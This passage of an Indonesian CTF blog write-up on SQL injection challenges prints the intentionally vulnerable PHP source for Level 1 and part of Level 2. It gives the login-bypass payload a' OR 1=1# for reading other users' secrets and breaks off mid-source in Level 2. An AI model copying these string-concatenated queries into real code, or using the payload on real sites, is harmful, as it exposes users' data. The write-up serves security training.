<!DOCTYPE html>
<html>
<!--
====================================================
       _         _ _ _       _            ___ 
      | |       | (_) |     | |          / __)
  ____| | _   _ | |_| | ____| | _   ____| |__ 
 / _  | || \ / || | | |/ _  | || \ / ___)  __)
( ( | | |_) | (_| | | ( ( | | | | | |   | |   
 \_||_|____/ \____|_|_|\_||_|_| |_|_|   |_|  
 
====================================================
@ABDILAHRF
====================================================
-->
<head>
<meta charset="utf-8">
<title>SQLINJECTION CHALLENGES WRITEUP: LEVEL 1 - 8 &vert; @ABDILAHRF</title>
<meta name="description" content="Writeup SQLInjection Challenges">
<meta name="keywords" content="sqlinjection">

<!-- Twitter Cards -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="/images/sqlinjection.jpg">

<meta name="twitter:title" content="SQLInjection Challenges Writeup: Level 1 - 8">
<meta name="twitter:description" content="Writeup SQLInjection Challenges">
<meta name="twitter:creator" content="@abdilahrf">

<!-- Open Graph -->
<meta property="og:locale" content="en_US">
<meta property="og:type" content="article">
<meta property="og:title" content="SQLInjection Challenges Writeup: Level 1 - 8">
<meta property="og:description" content="Writeup SQLInjection Challenges">
<meta property="og:url" content="http://localhost:4000/web%20exploitation/writeup-sqlinjection-chall">
<meta property="og:site_name" content="@abdilahrf">
<meta property="og:image" content="http://localhost:4000/images//images/sqlinjection.jpg">





<link rel="canonical" href="http://localhost:4000/web%20exploitation/writeup-sqlinjection-chall">
<link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="@abdilahrf Feed">
<link rel="author" href="https://plus.google.com/?rel=author">

<!-- http://t.co/dKP3o1e -->
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />


    <link href='https://fonts.googleapis.com/css?family=Montserrat:400,700|Open+Sans:400,600,300,800,700' rel='stylesheet' type='text/css'>
	<link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/font-awesome.min.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/normalize.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/nprogress.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/vendor/foundation.min.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/style.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/post.css">
    <link rel="stylesheet" href="http://localhost:4000/assets/css/code/monokai.css">





<!-- Icons -->
<!-- 16x16 -->
<link rel="shortcut icon" href="http://localhost:4000/favicon.ico">
<!-- 32x32 -->
<link rel="shortcut icon" href="http://localhost:4000/favicon.png">
<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
<link rel="apple-touch-icon-precomposed" href="http://localhost:4000/images/apple-touch-icon-precomposed.png">
<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://localhost:4000/images/apple-touch-icon-72x72-precomposed.png">
<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://localhost:4000/images/apple-touch-icon-114x114-precomposed.png">
<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/images/apple-touch-icon-144x144-precomposed.png">

<style type="text/css">@media only screen and (min-width:43.75em){.notepad-post-content div>p:first-child:first-letter{float:left;font-size:4.688rem;line-height:4.375rem;padding-top:.25rem;padding-right:.5rem;padding-left:.188rem;font-family:serif}}</style>
</head>
<body class="post-template" itemscope itemtype="http://schema.org/WebPage">  

        <main id="notepad-post-container" class="notepad-post-container intro-effect-sliced" role="main">
            <header class="notepad-post-header">
                <div class="bg-img"></div>
                
                <div class="notepad-post-menu-header">

                    <a class="notepad-blog-logo" href="http://localhost:4000">
                        <img src="http://localhost:4000/images/logo.png" alt="Blog Logo" />
                    </a>

                <div class="notepad-blog-menu">      
    <div class="notepad-mobile-menu show-for-small">
        <a href="#"><i class="fa fa-bars"></i></a>
    </div>
    <ul class="notepad-menu">
        <li class="notepad-mobile-close-btn show-for-small text-right">
            <a href="#"><i class="fa fa-times"></i></a>
        </li>

            <li>
                    <a href="http://localhost:4000/">Home</a>
                 </li>

            <li>
                    <a href="http://localhost:4000/featured">Featured Posts</a>
                 </li>

            <li>
                    <a href="http://localhost:4000/categories">Categories</a>
                 </li>

            <li>
                    <a href="http://localhost:4000/about">About</a>
                 </li>
            
           <li><a href="http://localhost:4000/feed.xml" title="Atom/RSS feed"><i class="icon-rss"></i> Feed</a></li>
    </ul>

</div>
            </div>

            <div class="notepad-post-title bg-check">
                <h1>SQLInjection Challenges Writeup: Level 1 - 8</h1>
                <p>by <strong>Abdillah Muhamad</strong> &#8212; on <a href="http://localhost:4000/tags/index.html#sqlinjection" data-toggle="tooltip" title="Posts tagged with sqlinjection" rel="tag">sqlinjection</a> <strong><time datetime="2017-03-20 00:00:00 +0700">2017-03-20 00:00:00 +0700</time></strong></p>
            </div>
            <div class="bg-img"></div>
        </header>
        <button class="trigger bg-check" data-info="Read more"><span>Trigger</span></button>
        <img src="/images/sqlinjection.jpg" alt="cover-image" />

        <article class="notepad-post-content post">
            <div><h3 id="sql-injection-challenges-writeup">SQL Injection Challenges Writeup</h3>

<p>Kita dapet soal ada 8 soal SQL injection yang cara untuk solvenya beragam, beberapa dari soal ngak bisa di selesain menggunakan automated tools seperti “SQLmap”,”Havij” atau kawan-kawannya di sini juga ada beberapa logic bypass yang perlu kita cari sendiri.</p>

<h3 id="level-1">Level 1</h3>

<blockquote>
  <p>My friend created a website where we can store secrets… Unfortunately, we can only see our own. Help me find all of my friend’s secrets.</p>
</blockquote>

<p>Diberikan soal dan disertakan source code nya berikut :</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'source'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">require</span><span class="p">(</span><span class="s2">"conf/level1.conf.php"</span><span class="p">);</span> 
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

<span class="nb">session_start</span><span class="p">();</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'secret'</span><span class="p">]))</span> <span class="p">{</span> 
    <span class="nv">$query</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"INSERT INTO secrets(session_id, secret) VALUES (?, ?)"</span><span class="p">);</span>
    <span class="nb">session_regenerate_id</span><span class="p">();</span>
    <span class="nv">$current_session_id</span> <span class="o">=</span> <span class="nb">session_id</span><span class="p">();</span>
    <span class="c1">//die($current_session_id);</span>
    <span class="nv">$query</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s1">'ss'</span><span class="p">,</span> <span class="nv">$current_session_id</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'secret'</span><span class="p">]);</span>
    <span class="nv">$query</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">()</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'session_id'</span><span class="p">]))</span> <span class="p">{</span> 
    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM secrets WHERE session_id = '"</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'session_id'</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"'"</span><span class="p">;</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT * FROM secrets WHERE session_id = '"</span> <span class="o">.</span> <span class="nb">session_id</span><span class="p">()</span> <span class="o">.</span> <span class="s2">"'"</span><span class="p">;</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
<span class="p">}</span> 

<span class="cp">?&gt;</span>

<span class="cp">&lt;!DOCTYPE HTML&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
        <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">integrity=</span><span class="s">"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u"</span> <span class="na">crossorigin=</span><span class="s">"anonymous"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"custom-bootstrap-menu"</span> <span class="na">class=</span><span class="s">"navbar navbar-default "</span> <span class="na">role=</span><span class="s">"navigation"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container-fluid"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"navbar-header"</span><span class="nt">&gt;&lt;a</span> <span class="na">class=</span><span class="s">"navbar-brand"</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Secret Diary<span class="nt">&lt;/a&gt;</span>
                <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"button"</span> <span class="na">class=</span><span class="s">"navbar-toggle"</span> <span class="na">data-toggle=</span><span class="s">"collapse"</span> <span class="na">data-target=</span><span class="s">".navbar-menubuilder"</span><span class="nt">&gt;&lt;span</span> <span class="na">class=</span><span class="s">"sr-only"</span><span class="nt">&gt;</span>Toggle navigation<span class="nt">&lt;/span&gt;&lt;span</span> <span class="na">class=</span><span class="s">"icon-bar"</span><span class="nt">&gt;&lt;/span&gt;&lt;span</span> <span class="na">class=</span><span class="s">"icon-bar"</span><span class="nt">&gt;&lt;/span&gt;&lt;span</span> <span class="na">class=</span><span class="s">"icon-bar"</span><span class="nt">&gt;&lt;/span&gt;</span>
                <span class="nt">&lt;/button&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"collapse navbar-collapse navbar-menubuilder"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"nav navbar-nav navbar-left"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span>
                <span class="nt">&lt;/li&gt;</span>
                <span class="nt">&lt;/ul&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container-fluid"</span><span class="nt">&gt;</span>
        <span class="cp">&lt;?php</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'secret'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">'&lt;div class="alert alert-success" role="alert"&gt;Secret added successfully. You can view your secrets with the following session ID : '</span><span class="o">.</span> <span class="nb">session_id</span><span class="p">()</span> <span class="o">.</span><span class="s1">'&lt;/div&gt;'</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="cp">?&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-2"</span><span class="nt">&gt;&lt;/div&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-4"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"level1.php"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"input-group"</span><span class="nt">&gt;</span>
                      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"session_id"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">placeholder=</span><span class="s">"Your session ID"</span> <span class="na">aria-describedby=</span><span class="s">"basic-addon2"</span><span class="nt">&gt;</span>
                      <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"input-group-btn"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;button</span> <span class="na">class=</span><span class="s">"btn btn-default"</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>Get your secrets!<span class="nt">&lt;/button&gt;</span>
                     <span class="nt">&lt;/span&gt;</span>
                    <span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/form&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-4"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"level1.php"</span><span class="nt">&gt;</span>

                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"input-group"</span><span class="nt">&gt;</span>
                      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"secret"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">placeholder=</span><span class="s">"Your secret"</span> <span class="na">aria-describedby=</span><span class="s">"basic-addon2"</span><span class="nt">&gt;</span>
                      <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"input-group-btn"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;button</span> <span class="na">class=</span><span class="s">"btn btn-default"</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>Add a new secret!<span class="nt">&lt;/button&gt;</span>
                     <span class="nt">&lt;/span&gt;</span>
                    <span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/form&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-2"</span><span class="nt">&gt;&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>

    <span class="nt">&lt;br/&gt;</span>
    <span class="nt">&lt;br/&gt;</span>
    <span class="nt">&lt;br/&gt;</span>

        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container-fluid"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-4"</span><span class="nt">&gt;&lt;/div&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-4"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel panel-default"</span><span class="nt">&gt;</span>
                  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"panel-heading"</span><span class="nt">&gt;</span>Your secrets<span class="nt">&lt;/div&gt;</span>

                  <span class="c">&lt;!-- Table --&gt;</span>
                  <span class="nt">&lt;table</span> <span class="na">class=</span><span class="s">"table"</span><span class="nt">&gt;</span>
                    <span class="cp">&lt;?php</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                        <span class="c1">// output data of each row</span>
                        <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
                        <span class="k">echo</span> <span class="s2">"&lt;tr&gt;&lt;td&gt;"</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'secret'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"&lt;/td&gt;&lt;/tr&gt;"</span><span class="p">;</span>    
                        <span class="p">}</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="k">echo</span> <span class="s2">"&lt;tr&gt;&lt;td&gt;You don't have any secrets yet.&lt;/td&gt;&lt;/tr&gt;"</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="cp">?&gt;</span>
                  <span class="nt">&lt;/table&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-4"</span><span class="nt">&gt;&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>

        <span class="nt">&lt;/div&gt;</span>

    <span class="nt">&lt;script
              </span><span class="na">src=</span><span class="s">"https://code.jquery.com/jquery-3.1.1.min.js"</span>
              <span class="na">integrity=</span><span class="s">"sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="</span>
              <span class="na">crossorigin=</span><span class="s">"anonymous"</span><span class="nt">&gt;&lt;/script&gt;</span>

        <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>


<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
1
</code></pre></div></div>

<p>cara untuk menjalankan query yang benar adalah menggunakan prepared statement seperti yang di gunakana pada<code class="highlighter-rouge">$query = $conn-&gt;prepare("INSERT INTO secrets(session_id, secret) VALUES (?, ?)");</code>namun masih ada kesalahan pada bagian <code class="highlighter-rouge">$query = "SELECT * FROM secrets WHERE session_id = '" . $_POST['session_id'] . "'";</code> di sini kesalahannya dia langsung memasukan input user ke dalam query tanpa menggunakan prepared statement jadi kita bisa injeksi sql di situ</p>

<p>dengan simple <code class="highlighter-rouge">a' OR 1=1#</code> kita bisa mendapatkan flagnya</p>

<p><img src="/images/flag-sqli-lv1.png" alt="" /></p>

<h3 id="level-2">Level 2</h3>

<blockquote>
  <p>I think an administrator blocked my account. Can you help me steal someone else’s account?</p>

  <p><strong>Note</strong>: There are two flags in this challenge.</p>
</blockquote>

<p>Diberikan soal yang meminta kita untuk melakukan login dan kita juga diberikan akses ke source code nya</p>

<p><img src="/images/sqli-lv2.png" alt="" /></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'source'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">));</span>
<span class="p">}</span>
<span class="k">require</span><span class="p">(</span><span class="s2">"conf/level2.conf.php"</span><span class="p">);</span> 
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>

    <span class="c1">// $query = "SELECT flag FROM my_secret_table"; We leave commented code in production because we're cool.</span>

    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"SELECT username FROM users where username = '"</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"' and password = ?"</span><span class="p">;</span>

    <span class="c1">// We use prepared statements, it must be secure.</span>
    <span class="nv">$query</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span> 

    <span class="c1">// If query is invalid</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$query</span> <span class="o">===</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$error</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
        <span class="nv">$error_msg</span> <span class="o">=</span> <span class="s2">"&lt;strong&gt;Error!&lt;/strong&gt; Invalid SQL query"</span><span class="p">;</span>    
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>

    <span class="c1">// Bind password param</span>
    <span class="nv">$query</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">"s"</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]);</span>
    <span class="nv">$query</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
    <span class="nv">$query</span><span class="o">-&gt;</span><span class="na">bind_result</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
    <span class="nv">$query</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">();</span>

        <span class="c1">// Check if a valid user has been found</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">!=</span> <span class="k">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="nb">session_start</span><span class="p">();</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'is_logged_in'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$error</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
            <span class="nv">$error_msg</span> <span class="o">=</span> <span class="s2">"&lt;strong&gt;Wrong!&lt;/strong&gt; Username/Password is invalid."</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

<span class="p">}</span>
<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE HTML&gt;</span>
<span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>
        <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">integrity=</span><span class="s">"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u"</span> <span class="na">crossorigin=</span><span class="s">"anonymous"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;style&gt;</span>
        <span class="nc">.corb-body</span> <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#333</span><span class="p">;}</span>

        <span class="nc">.centered</span> <span class="p">{</span>
          <span class="nl">position</span><span class="p">:</span> <span class="nb">fixed</span><span class="p">;</span>
          <span class="nl">top</span><span class="p">:</span> <span class="m">50%</span><span class="p">;</span>
          <span class="nl">left</span><span class="p">:</span> <span class="m">50%</span><span class="p">;</span>
          <span class="c">/* bring your own prefixes */</span>
          <span class="nl">transform</span><span class="p">:</span> <span class="n">translate</span><span class="p">(</span><span class="m">-50%</span><span class="p">,</span> <span class="m">-50%</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="nc">.corb-login-length</span> <span class="p">{</span> <span class="nl">width</span><span class="p">:</span> <span class="m">500px</span><span class="p">;}</span>
        <span class="nc">.corb-submit</span> <span class="p">{</span> <span class="nl">position</span><span class="p">:</span> <span class="nb">relative</span><span class="p">;</span> <span class="nl">left</span><span class="p">:</span> <span class="nb">auto</span><span class="p">;</span> <span class="nl">right</span><span class="p">:</span> <span class="m">-420px</span><span class="p">;}</span>
        <span class="nc">.corb-flag</span> <span class="p">{</span> <span class="nl">color</span><span class="p">:</span> <span class="m">#0F0</span><span class="p">;</span> <span class="p">}</span>
        <span class="nc">.corb-alert</span> <span class="p">{</span> <span class="nl">margin-top</span><span class="p">:</span> <span class="m">20px</span><span class="p">;</span> <span class="p">}</span>
    <span class="nt">&lt;/style&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body</span> <span class="na">class=</span><span class="s">"corb-body container-fluid"</span><span class="nt">&gt;</span>
        <span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'is_logged_in'</span><span class="p">]</span> <span class="o">!==</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span> <span class="cp">?&gt;</span>
            <span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$error</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$error</span> <span class="o">===</span> <span class="kc">true</span><span class="p">)</span> <span class="p">{</span> <span class="cp">?&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container-fluid corb-alert"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"alert alert-danger"</span><span class="nt">&gt;</span>
                    <span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$error_msg</span><span class="p">;</span> <span class="cp">?&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
            <span class="cp">&lt;?php</span> <span class="p">}</span> <span class="cp">?&gt;</span>

        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"centered"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"well"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"corb-login-length"</span><span class="nt">&gt;</span>Login If You Can<span class="nt">&lt;/h3&gt;</span>
                    <span class="nt">&lt;br/&gt;</span>
                    <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">placeholder=</span><span class="s">"username"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;br/&gt;</span>
                    <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">placeholder=</span><span class="s">"password"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;br/&gt;</span>
                    <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"corb-submit btn btn-primary btn-lg"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Login"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;/form&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
        <span class="cp">&lt;?php</span> <span class="p">}</span><span class="k">else</span> <span class="p">{</span> <span class="cp">?&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"centered"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"corb-flag"</span><span class="nt">&gt;</span>Welcome <span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">];</span> <span class="cp">?&gt;</span>! Here's some green text for you.<span class="nt">&lt;/h1&gt;</span>        
                <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"corb-flag"</span><span class="nt">&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="nt">&lt;/h1&gt;</span>        
            <span class="nt">&lt;/div&gt;</span>
        <span class="cp">&lt;?php</span> <span class="p">}</span> <span class="cp">?&gt;</span>

        <span class="nt">&lt;script
              </span><span class="na">src=</span><span class="s">"https://code.jquery.com/jquery-3.1.1.min.js"</span>
              <span class="na">integrity=</span><span class="s">"sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="</span>
              <span class="na">crossorigin=</span><span class="s">"anonymous"</span><span class="nt">&gt;&lt;/script&gt;</span>

